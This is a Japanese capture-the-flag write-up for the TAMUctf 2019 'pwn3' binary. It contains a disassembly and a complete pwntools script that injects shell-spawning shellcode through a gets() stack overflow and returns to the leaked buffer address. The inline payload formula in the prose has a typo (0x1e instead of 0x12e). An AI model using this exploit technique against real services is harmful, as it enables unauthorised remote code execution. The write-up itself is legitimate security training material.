# pwn3
## Description 

実行ファイルが渡される
実行してみると
``` Take this, you might need it on your journey 0xffd1d53e! ```とある

## Solution
```
[*] '/home/mizuiro/PROJECTS/ctf/TAMUctf_19/pwn3/pwn3'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
実行したときに現れるアドレスはバッファのアドレスだった 
```
0x565555c3 in echo ()
gdb-peda$ disas 
Dump of assembler code for function echo:
   0x5655559d <+0>:	push   ebp
   0x5655559e <+1>:	mov    ebp,esp
   0x565555a0 <+3>:	push   ebx
   0x565555a1 <+4>:	sub    esp,0x134
   0x565555a7 <+10>:	call   0x565554a0 <__x86.get_pc_thunk.bx>
   0x565555ac <+15>:	add    ebx,0x1a20
   0x565555b2 <+21>:	sub    esp,0x8
   0x565555b5 <+24>:	lea    eax,[ebp-0x12a]
   0x565555bb <+30>:	push   eax
   0x565555bc <+31>:	lea    eax,[ebx-0x191c]
   0x565555c2 <+37>:	push   eax
=> 0x565555c3 <+38>:	call   0x56555410 <printf@plt>
   0x565555c8 <+43>:	add    esp,0x10
   0x565555cb <+46>:	sub    esp,0xc
   0x565555ce <+49>:	lea    eax,[ebp-0x12a]
   0x565555d4 <+55>:	push   eax
   0x565555d5 <+56>:	call   0x56555420 <gets@plt>
   0x565555da <+61>:	add    esp,0x10
   0x565555dd <+64>:	nop
   0x565555de <+65>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565555e1 <+68>:	leave  
   0x565555e2 <+69>:	ret    
End of assembler dump.
```
gets()が使われているので、スタック内のリターンアドレスを上書き出来ることがわかる。
そこでbufferにshellcodeを送って、そこに対して戻るようにリターンアドレスを書き換える
bufferの位置がebp-0x12aなのでそこからsave ebpをまたいでリターンアドレスを書き込む。
payload = shellcode + 'x90' * (0x1e-len(shellcode) + return address
### 疑似コード
```
int main(int arg0) {
    __x86.get_pc_thunk.ax();
    sub_440();
    echo();
    return 0x0;
}
int echo() {
    __x86.get_pc_thunk.bx();
    sub_410(); // printf
    eax = sub_420(); 
    return eax;
}
```

```python:solve.py
from pwn import *

io = remote("localhost",4088)
io.recvuntil("journey")
addr = io.recvuntil("!").rstrip(b"!")
addr_shellcode = int(addr,16)
log.info("&shellcode={}".format(hex(addr_shellcode)))

shellcode = asm(shellcraft.sh())

payload = shellcode
payload += b'\x90' * (0x12e-len(shellcode))
payload += p32(addr_shellcode)

io.sendline(payload)
io.interactive()
```
